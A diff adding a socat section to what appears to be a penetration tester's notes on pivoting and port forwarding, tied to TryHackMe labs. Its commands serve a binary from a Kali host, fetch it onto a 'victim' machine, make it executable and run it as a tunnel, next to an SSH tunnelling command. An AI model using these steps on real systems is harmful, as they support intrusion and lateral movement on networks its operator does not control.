@@ -52,7 +52,27 @@ passwd tunneluser
 ssh tunneluser@$KALI -R 8888:thmdc.za.tryhackme.com:80 -L *:1990:127.0.0.1:1990 -L *:1029:127.0.0.1:1029 -N
 ```
 
+## Socat
 
+**Examples**
+
+[#port-forwarding-and-finding-flag](../../walkthroughs/tryhackme/magician.md#port-forwarding-and-finding-flag "mention")
+
+**Kali**
+
+```
+wget https://github.com/aledbf/socat-static-binary/releases/download/v0.0.1/socat-linux-amd64
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim**
+
+```
+cd /tmp
+wget http://$KALI:81/socat-linux-amd64
+chmod +x socat-linux-amd64 
+./socat-linux-amd64  tcp-listen:7777,reuseaddr,fork tcp:localhost:6666
+```
 
 ## sshuttle
 
